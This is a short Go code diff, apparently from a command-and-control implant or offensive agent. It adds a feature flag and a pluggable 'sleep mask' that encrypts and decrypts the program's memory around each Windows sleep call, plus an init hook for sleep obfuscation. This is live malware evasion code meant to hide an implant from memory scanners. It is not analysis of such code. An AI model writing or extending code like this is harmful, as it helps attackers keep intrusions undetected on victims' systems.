@@ -36,6 +36,9 @@ var (
 )
 
 func InitSleepMask() bool {
+	if !enableSleepMask {
+		return false
+	}
 	smInitMu.Lock()
 	defer smInitMu.Unlock()
 	if smState.ready {
@@ -129,7 +132,20 @@ func (sm *sleepMaskState) xorCrypt(buf []byte) {
 }
 
 func sleepWithMask(d time.Duration) {
+	if activeSleepMask != nil {
+		activeSleepMask.Encrypt()
+		activeSleepMask.BeforeSleep(uintptr(d.Milliseconds()))
+		activeSleepMask.AfterWake()
+		activeSleepMask.Decrypt()
+		return
+	}
 	sleepMaskEncrypt()
 	procSleep.Call(uintptr(d.Milliseconds()))
 	sleepMaskDecrypt()
+}
+
+func init() {
+	sleepObfFunc = func(ms uintptr) {
+		procSleep.Call(ms)
+	}
 }
